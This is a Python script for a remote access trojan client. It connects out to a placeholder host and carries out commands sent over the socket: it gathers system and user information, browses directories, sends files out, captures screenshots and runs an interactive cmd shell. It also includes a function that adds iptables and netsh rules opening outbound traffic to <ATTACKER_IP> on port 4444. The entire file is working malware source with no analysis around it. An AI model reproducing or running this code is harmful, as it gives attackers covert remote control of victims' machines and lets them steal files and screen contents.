import socket, subprocess, platform, os, getpass, json, base64, time, pickle, gzip, pyautogui


def setup_firewall(os_name: str = 'nt' or 'posix'):
    # Need root permission
    # But we don't need this for many events because some of the firewalls already allow outgoing connections.
    __command = 'iptables -A OUTPUT -p tcp -d <ATTACKER_IP> --dport 4444 -j ACCEPT' if os_name == 'posix' \
        else 'netsh advfirewall firewall add rule name="Allow Outbound 4444" dir=out action=allow protocol=TCP localport=4444'
    subprocess.run(__command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def file_send(file_name):
    global target
    with open(file_name, "rb") as file:
        data = file.read()
        time.sleep(0.25)
        batch_num = len(data) // 1024
        for i in range(batch_num):
            batch = data[i * 1024:(i + 1) * 1024]
            target.send(batch)
        batch = data[batch_num * 1024:]
        target.send(batch)
        time.sleep(1)
        target.send(("done").encode())


Host_ip = "HOST_IP"
Host_port = 5555
target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target.connect((Host_ip, Host_port))
# target.connect(("192.168.1.187",5555))
while True:
    receive = target.recv(1024).decode()
    if receive == "info":
        system_info = str(platform.uname())
        target.send(system_info.encode())
    elif receive == "cwd":
        cwd = os.getcwd()
        target.send(cwd.encode())
    elif receive == "ls":
        ls = str(os.listdir(os.getcwd()))
        target.send(ls.encode())
    elif "cd" in receive:
        try:
            os.chdir(receive.split("cd ")[1])
            perm = "1"
            target.send(perm.encode())
        except:
            perm = "0"
            target.send(perm.encode())
    elif receive == "user":
        user = getpass.getuser()
        target.send(user.encode())
    elif receive.split(" ")[0] == "get":
        print(receive.split("get ")[1])
        file_send(receive.split("get ")[1])

    elif receive == "shell":
        p = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while True:
            receive_cmd = target.recv(1024).decode()
            print(receive_cmd)
            if receive_cmd == "quit":
                print("break while loop")
                p.terminate()
                break
            else:
                p.stdin.write(receive_cmd.encode())
                p.stdin.write(b'\n')
                p.stdin.flush()

                output = p.stdout.readline().decode('cp1252')

                byte_data = pickle.dumps(output)

                compressed_data = gzip.compress(byte_data)

                target.send(compressed_data)

    elif receive == "screenshot":
        ss = pyautogui.screenshot()
        ss.save("temp.png")
        file_send("temp.png")
        os.remove("temp.png")
    elif receive == "q" or receive == "quit":
        target.close()
        break
